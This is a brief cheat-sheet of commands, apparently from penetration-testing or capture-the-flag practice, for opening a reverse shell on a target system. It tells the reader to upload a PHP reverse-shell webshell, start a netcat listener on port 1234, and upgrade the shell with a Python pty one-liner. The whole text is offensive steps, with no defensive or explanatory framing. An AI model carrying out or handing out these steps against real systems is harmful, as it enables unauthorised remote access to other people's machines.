# You upload a script on the target system
# e.g.: /usr/share/webshells/php/php-reverse-shell.php

# IP: the host machine (local ip)
# port: the same as netcat (e.g. 1234)

# First you should also set up a netcat connection
nc -lvnp 1234

######### So you have a reverse shell ############
# In order to have a functional shell you use:
python3 -c 'import pty;pty.spawn("/bin/bash")'
